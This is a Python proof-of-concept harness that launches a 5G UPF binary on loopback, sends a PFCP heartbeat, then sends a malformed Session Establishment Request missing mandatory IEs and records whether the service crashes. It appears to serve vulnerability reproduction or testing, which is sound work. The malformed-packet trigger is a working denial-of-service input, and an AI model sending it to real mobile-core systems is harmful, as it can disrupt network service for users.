#!/usr/bin/env python3
import argparse
import json
import os
import re
import signal
import socket
import subprocess
import sys
import tempfile
import time


PFCP_ADDR = ("127.0.0.1", 8805)


def make_config(path):
    config = {
        "mode": "af_packet",
        "access": {"ifname": "lo"},
        "core": {"ifname": "lo"},
        "cpiface": {"hostname": "", "http_port": "0", "dnn": "internet"},
        "n4_addr": "127.0.0.1",
        "resp_timeout": "2s",
        "read_timeout": 15,
        "log_level": "info",
    }
    with open(path, "w", encoding="utf-8") as f:
        json.dump(config, f)


def pfcp_no_seid(message_type, sequence, body=b"", flags=0x20):
    length = 4 + len(body)
    return bytes(
        [
            flags & 0xFF,
            message_type & 0xFF,
            (length >> 8) & 0xFF,
            length & 0xFF,
            (sequence >> 16) & 0xFF,
            (sequence >> 8) & 0xFF,
            sequence & 0xFF,
            0,
        ]
    ) + body


def heartbeat_request(sequence):
    recovery_timestamp_ie = b"\x00\x60\x00\x04\x00\x00\x00\x01"
    return pfcp_no_seid(1, sequence, recovery_timestamp_ie)


def malformed_session_establishment_request(sequence):
    # Message type 50 is PFCP Session Establishment Request. This minimal form
    # intentionally omits mandatory IEs while remaining a syntactically framed
    # PFCP message, so it reaches the service's request handling path.
    return pfcp_no_seid(50, sequence)


def recv_available(sock, duration):
    deadline = time.monotonic() + max(0.0, duration)
    replies = []
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        sock.settimeout(min(0.1, remaining))
        try:
            data, _ = sock.recvfrom(65535)
            replies.append(data.hex())
        except socket.timeout:
            continue
    return replies


def wait_for_ready(proc, sock, timeout):
    deadline = time.monotonic() + timeout
    transcript = []
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            return False, transcript
        seq = 1
        sock.sendto(heartbeat_request(seq), PFCP_ADDR)
        sock.settimeout(0.15)
        try:
            data, _ = sock.recvfrom(65535)
            transcript.append("heartbeat_response=" + data.hex())
            return True, transcript
        except socket.timeout:
            time.sleep(0.05)
    return False, transcript


def terminate_process(proc):
    if proc.poll() is not None:
        return
    try:
        proc.terminate()
        proc.wait(timeout=1.5)
    except subprocess.TimeoutExpired:
        try:
            proc.kill()
        except ProcessLookupError:
            pass
        try:
            proc.wait(timeout=1.5)
        except subprocess.TimeoutExpired:
            pass


def signal_name_from_returncode(returncode):
    if returncode is None or returncode >= 0:
        return None
    signum = -returncode
    try:
        return signal.Signals(signum).name
    except ValueError:
        return "SIG%d" % signum


def signal_name_from_trace(text):
    match = re.search(r"\[signal\s+(SIG[A-Z0-9]+)", text)
    if match:
        return match.group(1)
    return None


def looks_like_crash(returncode, combined_output):
    if returncode is not None and returncode < 0:
        return True
    crash_markers = (
        "panic:",
        "fatal error:",
        "runtime error:",
        "segmentation violation",
        "SIGSEGV",
        "SIGABRT",
        "SIGBUS",
        "stack trace",
    )
    return any(marker in combined_output for marker in crash_markers)


def collect_output(proc):
    try:
        stdout, stderr = proc.communicate(timeout=1.0)
    except subprocess.TimeoutExpired:
        terminate_process(proc)
        stdout, stderr = proc.communicate(timeout=1.0)
    return stdout, stderr


def choose_crash_trace(stdout, stderr):
    if looks_like_crash(None, stderr):
        return stderr
    if looks_like_crash(None, stdout):
        return stdout
    return stdout + stderr


def write_result(result, json_out):
    text = json.dumps(result, sort_keys=False, separators=(",", ":"))
    if json_out:
        with open(json_out, "w", encoding="utf-8") as f:
            f.write(text)
            f.write("\n")
    else:
        print(text)


def build_base_result(binary):
    return {
        "binary": binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "protocol_transcript", "value": "no_response", "path": None},
        "error": None,
    }


def run(binary, timeout):
    start = time.monotonic()
    result = build_base_result(binary)
    proc = None
    timed_out = False
    transcript = []

    try:
        if not os.path.exists(binary):
            result["error"] = "binary not found"
            return result
        if not os.access(binary, os.X_OK):
            result["error"] = "binary is not executable"
            return result

        with tempfile.TemporaryDirectory(prefix="upf-poc-") as tmpdir:
            config_path = os.path.join(tmpdir, "upf.jsonc")
            make_config(config_path)
            command = [binary, "-config", config_path]
            result["command"] = command

            proc = subprocess.Popen(
                command,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="replace",
            )

            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.bind(("127.0.0.1", 0))
                ready_budget = min(max(timeout * 0.45, 0.5), 3.0)
                ready, ready_transcript = wait_for_ready(proc, sock, ready_budget)
                transcript.extend(ready_transcript)
                if not ready:
                    if proc.poll() is None:
                        terminate_process(proc)
                    stdout, stderr = collect_output(proc)
                    result["stdout"] = stdout
                    result["stderr"] = stderr
                    result["returncode"] = proc.returncode
                    result["error"] = "listener never became ready"
                    return result

                trigger = malformed_session_establishment_request(2)
                sock.sendto(trigger, PFCP_ADDR)
                replies = recv_available(sock, min(0.35, max(timeout * 0.15, 0.05)))
                if replies:
                    transcript.extend("trigger_response=" + reply for reply in replies)
                else:
                    transcript.append("trigger_response=no_response")

                deadline = start + timeout
                while time.monotonic() < deadline:
                    if proc.poll() is not None:
                        break
                    time.sleep(0.05)

                if proc.poll() is None:
                    timed_out = True
                    terminate_process(proc)

            stdout, stderr = collect_output(proc)
            result["stdout"] = stdout
            result["stderr"] = stderr
            result["returncode"] = proc.returncode
            result["timed_out"] = timed_out

            all_output = stdout + stderr
            if not timed_out and looks_like_crash(proc.returncode, all_output):
                result["signal"] = (
                    signal_name_from_returncode(proc.returncode)
                    or signal_name_from_trace(all_output)
                )
                result["observable"] = {
                    "kind": "crash_trace",
                    "value": choose_crash_trace(stdout, stderr),
                    "path": None,
                }
            else:
                result["signal"] = None
                transcript_value = "\n".join(transcript) if transcript else "no_response"
                result["observable"] = {
                    "kind": "protocol_transcript",
                    "value": transcript_value,
                    "path": None,
                }
            return result
    except Exception as exc:
        result["error"] = "%s: %s" % (exc.__class__.__name__, exc)
        if proc is not None:
            terminate_process(proc)
            stdout, stderr = collect_output(proc)
            result["stdout"] = stdout
            result["stderr"] = stderr
            result["returncode"] = proc.returncode
        return result
    finally:
        if proc is not None and proc.poll() is None:
            terminate_process(proc)
        result["runtime_ms"] = int((time.monotonic() - start) * 1000)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=5.0)
    args = parser.parse_args()

    timeout = args.timeout if args.timeout > 0 else 5.0
    result = run(args.binary, timeout)
    write_result(result, args.json_out)


if __name__ == "__main__":
    main()
